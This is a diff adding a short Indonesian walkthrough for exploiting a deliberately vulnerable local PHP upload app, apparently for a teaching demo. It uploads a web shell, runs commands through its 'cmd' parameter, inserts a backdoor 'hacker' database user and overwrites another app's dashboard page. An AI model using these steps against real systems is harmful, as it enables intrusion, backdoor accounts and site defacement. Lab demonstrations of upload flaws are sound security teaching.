@@ -1,0 +1,12 @@
+Cara Demo Eksploitasi
+    Buka http://localhost/upload-vul/register.php → daftar akun biasa.
+    Login → buka Artikel (Versi RENTAN).
+    Upload shell.php.
+Akses:
+    http://localhost/upload-vul/uploads/shell.php?cmd=whoami
+Buat user baru:
+    http://localhost/upload-vul/uploads/shell.php?cmd=mysql -u root -e "INSERT INTO demo_app.users (username, password) VALUES ('hacker', 'hack123');"
+    Upload hacked.php.
+Ganti dashboard:
+    http://localhost/upload-vul/uploads/shell.php?cmd=copy C:\xampp\htdocs\upload-vul\uploads\hacked.php C:\xampp\htdocs\demo-app\dashboard.php
+    Login dengan hacker / hack123 → popup muncul!
